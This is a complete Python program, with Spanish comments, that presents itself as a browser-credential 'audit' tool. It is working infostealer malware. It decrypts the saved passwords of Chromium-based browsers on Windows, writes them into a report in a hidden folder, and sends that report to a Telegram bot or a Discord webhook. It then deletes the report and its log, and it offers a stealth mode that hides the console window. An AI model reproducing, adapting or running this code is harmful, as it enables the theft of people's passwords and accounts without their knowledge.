import os
import sys
import json
import html
import base64
import socket
import getpass
import importlib
import sqlite3
import shutil
import csv
import ctypes
import logging
import argparse
import requests
from pathlib import Path
from datetime import datetime

__version__ = "1.2.0"

# =========================================================================
# CREDENCIALES HARDCODED (Opcional - Úsalas en BASE64 para mayor sigilo)
# =========================================================================
# Tip: Convierte tus credenciales en Base64 con cualquier conversor online.
# =========================================================================
HARDCODED_TG_TOKEN   = ""  # Token del bot de Telegram      (B64 o Plano)
HARDCODED_TG_ID      = ""  # ID de destino: chat/grupo/canal (B64 o Plano)
HARDCODED_DS_WEBHOOK = ""  # URL del Webhook de Discord      (B64 o Plano)
# =========================================================================

if sys.platform != "win32":
    sys.exit(1)

def safe_b64_decode(val):
    """Intenta decodificar Base64 estricto. Si falla, devuelve el original intacto."""
    if not val:
        return ""
    try:
        return base64.b64decode(val, validate=True).decode('utf-8')
    except Exception:
        return val

try:
    win32crypt = importlib.import_module('win32crypt')
except ImportError:
    win32crypt = None

from Cryptodome.Cipher import AES

def _get_base_dir() -> Path:
    """Directorio del ejecutable/script. Compatible con PyInstaller (frozen)."""
    if getattr(sys, 'frozen', False):
        return Path(sys.executable).parent
    return Path(__file__).parent

def _setup_output_dir(preferred: Path) -> Path:
    """Crea la carpeta de salida oculta. Si el directorio no tiene permisos de escritura,
    usa APPDATA como fallback (compatible con C:\\Program Files\\ y rutas protegidas)."""
    for candidate in (preferred, Path(os.environ.get('APPDATA', os.getcwd())) / ".audit"):
        try:
            candidate.mkdir(exist_ok=True)
            # OR con atributos existentes para no destruir flags del sistema (SYSTEM, etc.)
            existing = ctypes.windll.kernel32.GetFileAttributesW(str(candidate))
            if existing != 0xFFFFFFFF:  # INVALID_FILE_ATTRIBUTES
                ctypes.windll.kernel32.SetFileAttributesW(str(candidate), existing | 0x2)
            return candidate
        except OSError:
            continue
    return preferred  # Último recurso: usar la ruta original aunque falle el ocultar

OUTPUT_DIR = _setup_output_dir(_get_base_dir() / ".audit")

_PID     = os.getpid()
LOG_FILE = OUTPUT_DIR / "pentest_audit.log"

_handlers = []
try:
    _handlers.append(logging.FileHandler(LOG_FILE, encoding='utf-8'))
except (PermissionError, OSError):
    pass  # Sin permisos de escritura: solo log en consola si está disponible
try:
    sys.stdout.fileno()
    _handlers.append(logging.StreamHandler(sys.stdout))
except (AttributeError, OSError):
    pass
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=_handlers
)
logger = logging.getLogger(__name__)

if win32crypt is None:
    logger.critical("pywin32 no instalado. Ejecuta: pip install pywin32")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Reporte de Auditoría Chromium</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #333; margin: 40px; }
        .container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th:nth-child(1), td:nth-child(1), th:nth-child(2), td:nth-child(2) { white-space: nowrap; width: 1%; }
        td:nth-child(3), td:nth-child(4), td:nth-child(5) { word-break: break-all; }
        th { background-color: #3498db; color: white; }
        tr:hover { background-color: #f1f1f1; }
        .browser-badge { padding: 4px 8px; border-radius: 4px; font-size: 0.85em; font-weight: bold; }
        .chrome { background-color: #ffeb3b; color: #333; }
        .edge { background-color: #03a9f4; color: white; }
        .brave { background-color: #ff5722; color: white; }
        .opera { background-color: #f44336; color: white; }
        .footer { margin-top: 20px; font-size: 0.9em; color: #777; text-align: center; }
        .skipped { color: #aaa; font-style: italic; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Auditoría de Credenciales Chromium</h1>
        <div style="background:#f8f9fa; border-left:4px solid #3498db; padding:12px 16px; margin-bottom:16px; font-size:0.92em; border-radius:0 4px 4px 0;">
            <strong>Metadatos del Reporte</strong><br>
            Fecha: <b>{{date}}</b> &nbsp;|&nbsp;
            Host: <b>{{hostname}}</b> &nbsp;|&nbsp;
            Usuario: <b>{{username}}</b> &nbsp;|&nbsp;
            PID: <b>{{pid}}</b> &nbsp;|&nbsp;
            Versión: <b>{{version}}</b><br>
            Credenciales válidas: <b>{{total}}</b> &nbsp;|&nbsp;
            Filtradas (no-HTTP): <b>{{filtered_count}}</b>
        </div>
        <table>
            <thead>
                <tr>
                    <th>Navegador</th>
                    <th>Perfil</th>
                    <th>URL</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                </tr>
            </thead>
            <tbody>
                {{rows}}
            </tbody>
        </table>
        
        {{filtered_section}}

        <div class="footer">
            Suite de Auditoría Profesional - Uso bajo responsabilidad ética
            <span class="skipped">{{skipped_note}}</span>
        </div>
    </div>
</body>
</html>
"""

REQUEST_TIMEOUT = 15
MAX_RETRIES     = 3
VALID_URL_PREFIXES = ('http://', 'https://')


def retry_request(func):
    """Decorador que reintenta peticiones HTTP. Devuelve False si fallan todos los intentos,
    NUNCA propaga la excepción al caller para garantizar que el proceso no muera."""
    def wrapper(*args, **kwargs):
        for i in range(MAX_RETRIES):
            try:
                return func(*args, **kwargs)
            except (requests.exceptions.RequestException, Exception) as e:
                logger.warning(f"Intento {i+1}/{MAX_RETRIES} fallido: {e}")
        logger.error(f"Todos los intentos de {func.__name__} agotados. Abortando envío.")
        return False
    return wrapper


class Exfiltrator:
    def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None):
        self.telegram_token   = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.discord_webhook  = discord_webhook

    @retry_request
    def send_to_telegram(self, file_path):
        if not self.telegram_token or not self.telegram_chat_id:
            return False
        url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
        with open(file_path, 'rb') as f:
            response = requests.post(
                url,
                data={'chat_id': self.telegram_chat_id},
                files={'document': f},
                timeout=REQUEST_TIMEOUT
            )
        if response.status_code == 200:
            logger.info("Exfiltración vía Telegram exitosa.")
            return True
        logger.error(f"Telegram HTTP {response.status_code}: {response.text[:200]}")
        return False

    @retry_request
    def send_to_discord(self, file_path):
        if not self.discord_webhook:
            return False
        with open(file_path, 'rb') as f:
            response = requests.post(
                self.discord_webhook,
                files={'file': f},
                timeout=REQUEST_TIMEOUT
            )
        if response.status_code in (200, 204):
            logger.info("Exfiltración vía Discord exitosa.")
            return True
        logger.error(f"Discord HTTP {response.status_code}: {response.text[:200]}")
        return False


class ChromiumDecryptor:
    def __init__(self):
        self.local   = Path(os.environ.get('LOCALAPPDATA', ''))
        self.roaming = Path(os.environ.get('APPDATA', ''))
        self.browsers = {
            "Chrome":   self.local   / "Google/Chrome/User Data",
            "Edge":     self.local   / "Microsoft/Edge/User Data",
            "Brave":    self.local   / "BraveSoftware/Brave-Browser/User Data",
            "Vivaldi":  self.local   / "Vivaldi/User Data",
            "Opera":    self.roaming / "Opera Software/Opera Stable",
            "Opera GX": self.roaming / "Opera Software/Opera GX Stable",
        }

    def get_key(self, path):
        ls = path / "Local State"
        if not ls.exists():
            return None
        try:
            with open(ls, "r", encoding='utf-8') as f:
                config = json.load(f)
            key = base64.b64decode(config["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1] if win32crypt else None
        except Exception:
            return None

    def decrypt(self, blob, key):
        """Descifra datos de Chromium con fallback mejorado para versiones sin prefijo estándar."""
        if not blob:
            return ""
        
        if not isinstance(blob, (bytes, bytearray)):
            try:
                blob = bytes(blob)
            except Exception:
                return "[Error: Formato de datos inválido]"

        if len(blob) < 3:
            return "[Error: Dato muy corto]"

        try:
            # Caso 1: Intentar AES-GCM si tenemos la Master Key y longitud suficiente
            # Somos más permisivos que antes: si tiene longitud de AES, probamos aunque falte el prefijo 'v10'
            if key and len(blob) >= 32:
                try:
                    nonce   = blob[3:15]
                    payload = blob[15:-16]
                    cipher  = AES.new(key, AES.MODE_GCM, nonce)
                    decrypted = cipher.decrypt(payload)
                    return decrypted.decode('utf-8', errors='replace')
                except Exception:
                    # Si falla el intento de AES, bajamos al método Legacy DPAPI
                    pass

            # Caso 2: Legacy DPAPI (para versiones muy antiguas o blobs específicos)
            if win32crypt:
                decrypted = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
                return decrypted.decode('utf-8', errors='replace')
            
            return "[Error: Falta pywin32 para Legacy]"

        except Exception as e:
            err_type = type(e).__name__
            logger.debug(f"Falla en descifrado ({err_type}): {e}")
            return f"[Error: {err_type}]"

    def audit(self, fmt="html", out="audit_report"):
        data          = []
        filtered_data = []
        skipped       = 0

        for name, path in self.browsers.items():
            if not path.exists():
                continue
            key = self.get_key(path)
            if not key:
                continue
            profs = []
            try:
                # Detección exhaustiva de perfiles (Default, Profile X, o carpeta base si no hay subcarpetas)
                profs = [p for p in path.iterdir()
                         if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
            except Exception as e:
                logger.warning(f"Error detectando perfiles en {name}: {e}")

            if not profs:
                # Algunos navegadores (como Opera antiguo o versiones custom) usan la ruta base directamente
                profs = [path]

            for p in profs:
                db = p / "Login Data"
                if not db.exists():
                    continue
                tmp  = OUTPUT_DIR / f"tmp_audit_{_PID}.db"
                conn = None
                try:
                    shutil.copy2(db, tmp)
                    conn   = sqlite3.connect(tmp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        if not (row[0] and row[1] and row[2]):
                            continue
                        if not row[0].startswith(VALID_URL_PREFIXES):
                            filtered_data.append([name, p.name, row[0], row[1], self.decrypt(row[2], key)])
                            skipped += 1
                            continue
                        data.append([name, p.name, row[0], row[1], self.decrypt(row[2], key)])
                    cursor.close()
                except Exception as e:
                    logger.warning(f"Error leyendo {name}/{p.name}: {e}")
                finally:
                    if conn:
                        conn.close()
                    tmp.unlink(missing_ok=True)

        if skipped:
            logger.info(f"{skipped} entradas descartadas (URLs no-http).")

        if not data:
            logger.info("No se encontraron credenciales.")
            return 0, None

        stamp      = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_out   = OUTPUT_DIR / f"{out}.{fmt}"
        final_out  = OUTPUT_DIR / f"{out}_{stamp}.{fmt}" if base_out.exists() else base_out
        if final_out != base_out:
            logger.info(f"Archivo existente. Guardando como: {final_out.name}")

        skipped_note  = f" · {skipped} entradas no-http descartadas" if skipped else ""
        hostname      = socket.gethostname()
        username      = getpass.getuser()
        date_readable = (stamp[:4] + "-" + stamp[4:6] + "-" + stamp[6:8]
                         + " " + stamp[9:11] + ":" + stamp[11:13])

        if fmt == "csv":
            with open(final_out, 'w', newline='', encoding='utf-8') as f:
                w = csv.writer(f)
                # Metadata header rows (prefixed with # for easy parsing)
                w.writerow(["# Reporte Chromium Credentials Auditor"])
                w.writerow([f"# Fecha: {date_readable}"])
                w.writerow([f"# Host: {hostname}"])
                w.writerow([f"# Usuario: {username}"])
                w.writerow([f"# PID: {_PID}"])
                w.writerow([f"# Version: {__version__}"])
                w.writerow([f"# Total validos: {len(data)} | Filtrados: {skipped}"])
                w.writerow([])  # blank separator
                w.writerow(["Browser", "Profile", "URL", "User", "Pass"])
                w.writerows(data)

        elif fmt == "html":
            rows_html = ""
            for r in data:
                badge_class = r[0].lower().replace(' ', '-')
                rows_html += (
                    f"<tr><td><span class='browser-badge {badge_class}'>{html.escape(r[0])}</span></td>"
                    f"<td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td>"
                    f"<td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>"
                )
            # Generar sección de filtrados
            filtered_section = ""
            if filtered_data:
                filtered_rows = ""
                for r in filtered_data:
                    badge_class = r[0].lower().replace(' ', '-')
                    filtered_rows += (
                        f"<tr><td><span class='browser-badge {badge_class}'>{html.escape(r[0])}</span></td>"
                        f"<td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td>"
                        f"<td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>"
                    )
                filtered_section = f"""
                <h2 style="margin-top: 40px; color: #e67e22; border-bottom: 2px solid #e67e22; padding-bottom: 10px;">Entradas Filtradas (No-HTTP/Otros)</h2>
                <table>
                    <thead>
                        <tr>
                            <th>Navegador</th>
                            <th>Perfil</th>
                            <th>URL / Protocolo</th>
                            <th>Usuario</th>
                            <th>Contraseña</th>
                        </tr>
                    </thead>
                    <tbody>
                        {filtered_rows}
                    </tbody>
                </table>
                """

            # total y date se reemplazan ANTES que rows para evitar colisión con datos de usuario
            html_out = (HTML_TEMPLATE
                        .replace("{{total}}", str(len(data)))
                        .replace("{{filtered_count}}", str(skipped))
                        .replace("{{date}}", date_readable)
                        .replace("{{hostname}}", html.escape(hostname))
                        .replace("{{username}}", html.escape(username))
                        .replace("{{pid}}", str(_PID))
                        .replace("{{version}}", html.escape(__version__))
                        .replace("{{skipped_note}}", skipped_note)
                        .replace("{{rows}}", rows_html)
                        .replace("{{filtered_section}}", filtered_section))
            with open(final_out, "w", encoding='utf-8') as f:
                f.write(html_out)

        logger.info(f"Reporte guardado en: {final_out}")
        return len(data), final_out


def _close_log_handler():
    """Cierra el FileHandler del root logger antes de borrar el archivo de log."""
    for handler in logging.root.handlers[:]:
        if isinstance(handler, logging.FileHandler):
            handler.close()
            logging.root.removeHandler(handler)


def main():
    parser = argparse.ArgumentParser(description="Chromium Credentials Auditor Suite")
    parser.add_argument("-f", "--format",  choices=["csv", "html"], default="html",
                        help="Formato de salida del reporte.")
    parser.add_argument("-o", "--output",  default="audit_report",
                        help="Nombre base del archivo de salida.")
    parser.add_argument("-t", "--telegram-token",  default=HARDCODED_TG_TOKEN,
                        help="Token del bot de Telegram (Plano o Base64).")
    parser.add_argument("-c", "--telegram-chatid", default=HARDCODED_TG_ID,
                        help="Chat ID personal de Telegram (Plano o Base64).")
    parser.add_argument("-d", "--discord", default=HARDCODED_DS_WEBHOOK,
                        help="URL del Webhook de Discord (Plano o Base64).")
    parser.add_argument("-s", "--stealth", action="store_true",
                        help="Modo sigiloso: oculta la ventana de consola (idéntico a .exe --noconsole).")
    parser.add_argument("--no-wipe", action="store_true",
                        help="Desactiva el auto-borrado del reporte tras exfiltración.")
    parser.add_argument("--clean", action="store_true",
                        help="Elimina todos los reportes acumulados en la carpeta de salida y sale.")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Muestra logs detallados de depuración en consola.")

    args = parser.parse_args()

    if args.stealth:
        # Ocultar consola AQUÍ: después de parsear args, cuando ya sabemos que el
        # proceso arrancó bien. Hacerlo al inicio del módulo mascaraba errores de
        # importación en otras PCs con pywin32 mal instalado.
        if getattr(sys, 'frozen', False):
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
        for handler in logging.root.handlers[:]:
            if isinstance(handler, logging.StreamHandler) and not isinstance(handler, logging.FileHandler):
                logging.root.removeHandler(handler)
        if args.verbose:
            logging.getLogger().setLevel(logging.DEBUG)  # bajar nivel ANTES de loggear
            logger.debug("Modo verbose activo en stealth; logs DEBUG → solo al archivo.")

    elif args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        logger.debug("Modo verbose activado.")

    token   = safe_b64_decode(args.telegram_token)
    chatid  = safe_b64_decode(args.telegram_chatid)
    discord = safe_b64_decode(args.discord)

    if args.clean:
        patterns = ["*.html", "*.csv"]
        removed  = 0
        for pat in patterns:
            for f in OUTPUT_DIR.glob(pat):
                try:
                    f.unlink()
                    removed += 1
                    logger.info(f"Eliminado: {f.name}")
                except OSError as e:
                    logger.warning(f"No se pudo eliminar {f.name}: {e}")
        logger.info(f"Limpieza completada: {removed} archivo(s) eliminado(s) de {OUTPUT_DIR}")
        return

    logger.info("Iniciando Chromium Credentials Auditor Suite...")

    count, final_file = ChromiumDecryptor().audit(args.format, args.output)
    logger.info(f"Escaneo finalizado: {count} credenciales extraídas.")

    if count > 0 and final_file:
        exf = Exfiltrator(token, chatid, discord)
        if token and chatid:
            exf.send_to_telegram(final_file)
        if discord:
            exf.send_to_discord(final_file)

        if not args.no_wipe and (token or discord):
            Path(final_file).unlink(missing_ok=True)
            _close_log_handler()  # cerrar FileHandler ANTES de borrar el .log
            LOG_FILE.unlink(missing_ok=True)


if __name__ == "__main__":
    main()
